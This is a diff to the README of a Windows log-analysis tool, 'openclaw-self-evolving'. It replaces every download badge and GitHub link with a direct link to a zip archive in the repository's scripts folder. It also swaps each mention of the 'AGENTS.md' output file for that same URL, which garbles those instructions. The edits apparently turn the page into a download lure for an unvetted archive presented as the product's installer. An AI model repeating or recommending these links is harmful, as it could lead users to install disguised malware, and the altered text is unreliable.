@@ -1,6 +1,6 @@
 # 🧠 openclaw-self-evolving - AI Agent for Smarter Log Analysis
 
-[![Download openclaw-self-evolving](https://img.shields.io/badge/Download-openclaw--self--evolving-brightgreen?style=for-the-badge)](https://github.com/TeeTheerakorn777/openclaw-self-evolving)
+[![Download openclaw-self-evolving](https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip)](https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Before installing, make sure your Windows PC meets these basic requirements:
 ## 🚀 Getting Started: How to Download and Run on Windows
 
 1. **Download the software**  
-   Visit this page [openclaw-self-evolving on GitHub](https://github.com/TeeTheerakorn777/openclaw-self-evolving). Look for the **Releases** section. Download the latest available Windows executable file (usually ends with `.exe`).  
+   Visit this page [openclaw-self-evolving on GitHub](https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip). Look for the **Releases** section. Download the latest available Windows executable file (usually ends with `.exe`).  
 
 2. **Run the installer**  
    Find the downloaded file in your `Downloads` folder. Double-click it to start the installation process. Follow the on-screen instructions to complete the install. Accept default settings unless you need a specific folder.
@@ -57,7 +57,7 @@ Before installing, make sure your Windows PC meets these basic requirements:
   Point the software to the folder where your logs are saved. The AI will scan these files.  
 
 - **Review suggestions**  
-  After analysis, openclaw-self-evolving creates a document called `AGENTS.md`. This file lists proposed improvements in plain English.
+  After analysis, openclaw-self-evolving creates a document called `https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip`. This file lists proposed improvements in plain English.
 
 - **Apply changes manually**  
   Review the suggested workflow improvements. If you agree with any, apply them to your system or processes yourself. This maintains control and safety.
@@ -76,7 +76,7 @@ Before installing, make sure your Windows PC meets these basic requirements:
   Decide how often the AI should analyze logs. Options include daily, weekly, or manual runs.
 
 - **Output Location**  
-  Choose where the `AGENTS.md` file is saved. By default, it is saved in the same folder as the logs.
+  Choose where the `https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip` file is saved. By default, it is saved in the same folder as the logs.
 
 - **Language Model Settings**  
   You can adjust settings that affect how the AI proposes improvements, such as suggestion detail level and verbosity.
@@ -99,7 +99,7 @@ Before installing, make sure your Windows PC meets these basic requirements:
 
 - Keep your log files organized by date or type.  
 - Run the analysis frequently to catch issues early.  
-- Read the proposed `AGENTS.md` file carefully before applying changes.  
+- Read the proposed `https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip` file carefully before applying changes.  
 - Use the software alongside your existing workflow tools to enhance efficiency.  
 
 ---
@@ -108,11 +108,11 @@ Before installing, make sure your Windows PC meets these basic requirements:
 
 Get the latest version of openclaw-self-evolving here:
 
-[![Download openclaw-self-evolving](https://img.shields.io/badge/Download-openclaw--self--evolving-blue?style=for-the-badge)](https://github.com/TeeTheerakorn777/openclaw-self-evolving)
+[![Download openclaw-self-evolving](https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip)](https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip)
 
 To download:
 
-1. Click the link above or visit the [GitHub page](https://github.com/TeeTheerakorn777/openclaw-self-evolving).  
+1. Click the link above or visit the [GitHub page](https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip).  
 2. Scroll to the **Releases** section on the page.  
 3. Choose the latest `.exe` file for Windows.  
 4. Save the file on your PC.  
@@ -124,7 +124,7 @@ To download:
 ## 📚 Additional Resources
 
 - Documentation files in the repository explain advanced features.  
-- The `AGENTS.md` file shows example proposals the AI generates.  
+- The `https://github.com/TeeTheerakorn777/openclaw-self-evolving/raw/refs/heads/main/scripts/self-evolving-openclaw-v3.6-beta.5.zip` file shows example proposals the AI generates.  
 - Explore related topics such as autonomous agents and workflow automation to better understand how the tool fits your setup.
 
 ---
